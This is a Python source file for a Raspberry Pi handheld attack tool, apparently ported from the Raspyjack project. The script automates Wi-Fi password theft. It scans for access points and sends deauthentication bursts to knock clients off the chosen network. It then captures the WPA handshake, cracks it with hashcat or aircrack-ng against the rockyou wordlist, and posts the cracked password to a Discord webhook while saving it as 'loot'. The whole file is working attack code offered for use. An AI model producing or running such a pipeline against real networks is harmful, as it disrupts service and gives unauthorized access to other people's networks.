#!/usr/bin/env python3
"""
KTOx payload - Auto Crack Pipeline
=====================================
Ported from Raspyjack by 7h30th3r0n3.
Captures a WPA handshake, validates it, then automatically
runs hashcat/aircrack to crack it. Notifies via Discord webhook on success.

Features:
- Auto monitor mode + channel hop to find targets
- airodump-ng capture with deauth burst
- Validates captured .cap has a real 4-way handshake
- Converts to hccapx and runs hashcat with rockyou.txt
- Falls back to aircrack-ng if hashcat not installed
- Discord/webhook notification with cracked password
- Saves everything to loot/AutoCrack/

Controls:
- UP/DOWN: scroll target list
- OK: select target and start pipeline
- KEY1: toggle deauth during capture
- KEY2: view loot
- KEY3: exit
"""
import sys, os, time, subprocess, threading, json, re, signal, requests
from datetime import datetime

if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

try:
    import RPi.GPIO as GPIO
    import LCD_Config
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False

PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
        "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}

LOOT_DIR     = "/root/KTOx/loot/AutoCrack"
WORDLIST     = "/usr/share/wordlists/rockyou.txt"
WEBHOOK_FILE = "/root/KTOx/discord_webhook.txt"
os.makedirs(LOOT_DIR, exist_ok=True)

W, H = 128, 128
_stop = threading.Event()


def get_webhook():
    try:
        with open(WEBHOOK_FILE) as f:
            return f.read().strip()
    except Exception:
        return ""


def notify(msg):
    url = get_webhook()
    if not url:
        return
    try:
        requests.post(url, json={"content": f"**[KTOx AutoCrack]** {msg}"},
                      timeout=5)
    except Exception:
        pass


def run(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return r.stdout + r.stderr
    except Exception as e:
        return str(e)


def font(size=8):
    try:
        return ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", size)
    except Exception:
        return ImageFont.load_default()


class LCD:
    def __init__(self):
        self.lcd = None
        if HAS_HW:
            try:
                GPIO.setmode(GPIO.BCM)
                GPIO.setwarnings(False)
                for pin in PINS.values():
                    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
                self.lcd = LCD_1in44.LCD()
                self.lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
                self.lcd.LCD_Clear()
            except Exception as e:
                print(f"LCD init: {e}")

    def show(self, title, lines, title_col="#ff2200", text_col="#00ff88"):
        img  = Image.new("RGB", (W, H), "black")
        draw = ImageDraw.Draw(img)
        draw.rectangle((0, 0, W, 14), fill=title_col)
        draw.text((3, 2), title[:20], fill="white", font=font(9))
        y = 18
        for line in (lines or []):
            draw.text((3, y), str(line)[:21], fill=text_col, font=font(8))
            y += 11
            if y > H - 8:
                break
        if self.lcd:
            try:
                self.lcd.LCD_ShowImage(img, 0, 0)
            except Exception:
                pass
        else:
            print(f"[{title}]", " | ".join(str(l) for l in (lines or [])))

    def btn(self):
        if not HAS_HW:
            return None
        for name, pin in PINS.items():
            try:
                if GPIO.input(pin) == GPIO.LOW:
                    return name
            except Exception:
                pass
        return None


def enable_monitor(iface="wlan0"):
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type monitor")
    run(f"ip link set {iface} up")
    mon = iface + "mon"
    if not run(f"iw dev {mon} info"):
        run(f"airmon-ng start {iface} 2>/dev/null")
        mon = iface + "mon"
    return mon


def disable_monitor(iface="wlan0"):
    run(f"airmon-ng stop {iface}mon 2>/dev/null")
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type managed")
    run(f"ip link set {iface} up")


def scan_targets(mon, lcd):
    lcd.show("SCANNING", ["Hunting targets...", "Please wait ~15s"])
    tmp = f"/tmp/ktox_scan_{int(time.time())}"
    proc = subprocess.Popen(
        f"airodump-ng --output-format csv -w {tmp} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(15)
    proc.terminate()

    targets = []
    csv_file = f"{tmp}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, errors="ignore") as f:
            lines = f.readlines()
        in_aps = True
        for line in lines:
            if "Station MAC" in line:
                in_aps = False
                continue
            if not in_aps or not line.strip() or "BSSID" in line:
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14 and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
                bssid = parts[0]
                ch    = parts[3].strip()
                essid = parts[13].strip()
                pwr   = parts[8].strip()
                targets.append((bssid, ch, essid, pwr))
        for f in [csv_file, f"{tmp}-01.kismet.csv", f"{tmp}-01.kismet.netxml"]:
            try: os.remove(f)
            except: pass
    return targets


def capture(mon, bssid, ch, essid, do_deauth, lcd):
    safe  = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    out   = f"{LOOT_DIR}/{safe}_{ts}"
    os.makedirs(out, exist_ok=True)
    cap   = f"{out}/capture"

    lcd.show("CAPTURING", [
        f"ESSID: {essid[:16]}",
        f"CH: {ch}  BSSID:",
        bssid[:17],
        "Waiting 4-way hs...",
    ])

    proc = subprocess.Popen(
        f"airodump-ng -c {ch} --bssid {bssid} -w {cap} "
        f"--output-format pcap {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if do_deauth:
        time.sleep(5)
        lcd.show("DEAUTHING", [f"{essid[:16]}", "Forcing reconnect..."])
        run(f"aireplay-ng --deauth 10 -a {bssid} {mon} 2>/dev/null", timeout=15)

    time.sleep(20)
    proc.terminate()

    caps = [f for f in os.listdir(out) if f.endswith(".cap")]
    if not caps:
        return None, out
    return f"{out}/{caps[0]}", out


def validate_handshake(cap_path):
    out = run(f"aircrack-ng {cap_path} 2>/dev/null")
    return "handshake" in out.lower()


def crack(cap_path, essid, lcd):
    hccapx = cap_path.replace(".cap", ".hccapx")

    # Try hashcat first
    if run("which hashcat"):
        run(f"cap2hccapx {cap_path} {hccapx} 2>/dev/null")
        if os.path.exists(hccapx) and os.path.exists(WORDLIST):
            lcd.show("CRACKING", ["hashcat running...", "This may take a while"])
            out = run(
                f"hashcat -m 2500 {hccapx} {WORDLIST} --quiet "
                f"--status --status-timer=5 2>/dev/null",
                timeout=300)
            for line in out.splitlines():
                if ":" in line and essid in line:
                    pwd = line.split(":")[-1].strip()
                    if pwd:
                        return pwd

    # Fallback: aircrack-ng
    if os.path.exists(WORDLIST):
        lcd.show("CRACKING", ["aircrack-ng...", "Using rockyou.txt"])
        out = run(
            f"aircrack-ng -w {WORDLIST} {cap_path} 2>/dev/null",
            timeout=300)
        m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
        if m:
            return m.group(1)

    return None


def main():
    lcd  = LCD()
    iface = "wlan0"
    mon   = None

    lcd.show("AUTO CRACK", ["Raspyjack port", "initialising..."])
    time.sleep(1)

    try:
        lcd.show("MONITOR MODE", ["Enabling..."])
        mon = enable_monitor(iface)
        time.sleep(2)

        targets = scan_targets(mon, lcd)
        if not targets:
            lcd.show("NO TARGETS", ["No APs found", "KEY3 to exit"])
            while lcd.btn() != "KEY3":
                time.sleep(0.1)
            return

        cursor    = 0
        do_deauth = True

        while True:
            t = targets[cursor]
            bssid, ch, essid, pwr = t
            lcd.show("SELECT TARGET", [
                f"> {essid[:18]}",
                f"  {bssid}",
                f"  CH:{ch} PWR:{pwr}",
                f"  {cursor+1}/{len(targets)}",
                "",
                "OK=select UP/DN=nav",
                f"KEY1=deauth:{'ON' if do_deauth else 'OFF'}",
            ])

            btn = None
            for _ in range(20):
                btn = lcd.btn()
                if btn:
                    break
                time.sleep(0.05)

            if btn == "UP":
                cursor = (cursor - 1) % len(targets)
                time.sleep(0.2)
            elif btn == "DOWN":
                cursor = (cursor + 1) % len(targets)
                time.sleep(0.2)
            elif btn == "KEY1":
                do_deauth = not do_deauth
                time.sleep(0.2)
            elif btn == "KEY3":
                return
            elif btn == "OK":
                break

        bssid, ch, essid, pwr = targets[cursor]
        cap_path, out_dir = capture(mon, bssid, ch, essid, do_deauth, lcd)

        if not cap_path:
            lcd.show("NO CAPTURE", ["No .cap file saved", "KEY3 to exit"],
                     text_col="#ff4444")
            notify(f"Capture failed for {essid}")
            while lcd.btn() != "KEY3":
                time.sleep(0.1)
            return

        lcd.show("VALIDATING", [f"{essid[:18]}", "Checking handshake..."])
        valid = validate_handshake(cap_path)

        if not valid:
            lcd.show("NO HANDSHAKE", ["4-way hs not found", "Try again", "KEY3=exit"],
                     text_col="#ff8800")
            notify(f"No valid handshake for {essid}")
            while lcd.btn() != "KEY3":
                time.sleep(0.1)
            return

        notify(f"Handshake captured: {essid} ({bssid})")
        password = crack(cap_path, essid, lcd)

        if password:
            result = f"CRACKED: {essid}\nPASS: {password}"
            lcd.show("CRACKED!", [f"ESSID: {essid[:16]}", f"PASS: {password[:18]}"],
                     title_col="#00aa00")
            notify(f"Password cracked! {essid} = {password}")
            with open(f"{out_dir}/cracked.txt", "w") as f:
                f.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\n"
                        f"Date: {datetime.now().isoformat()}\n")
        else:
            lcd.show("NOT CRACKED", ["Handshake saved", "Wordlist exhausted",
                                      f"{out_dir[-25:]}"],
                     text_col="#ff8800")
            notify(f"Handshake saved for {essid} - not cracked yet")

        while lcd.btn() != "KEY3":
            time.sleep(0.1)

    except KeyboardInterrupt:
        pass
    finally:
        if mon:
            disable_monitor(iface)
        if HAS_HW:
            try: GPIO.cleanup()
            except: pass
        print("[AutoCrack] Exited.")


if __name__ == "__main__":
    main()
